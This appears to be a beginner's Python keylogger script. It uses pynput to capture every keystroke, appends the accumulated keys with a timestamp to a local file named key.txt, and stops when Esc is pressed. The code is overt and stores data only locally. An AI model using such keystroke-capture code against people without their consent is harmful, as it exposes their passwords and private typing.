from pynput.keyboard import Key,Listener
import datetime
k=[]
def press(key):
    k.append(key)
    write_to_file(k)
def write_to_file(list):
    with open("key.txt","a") as f:#mode append
        value=""
        for i in k:
            value+=str(i)
        f.write(value)
        f.write(str(datetime.datetime.now()))
        f.write("\n")
def release(key):
    if key==Key.esc:#when esc u will click program ends there.jf
        return False
with Listener(on_press=press,on_release=release) as listen:
    listen.join()#it is used becase the main method is a single thread so if u will not read this main thread excur=ted and program ends.so to stop the main thread we used this.f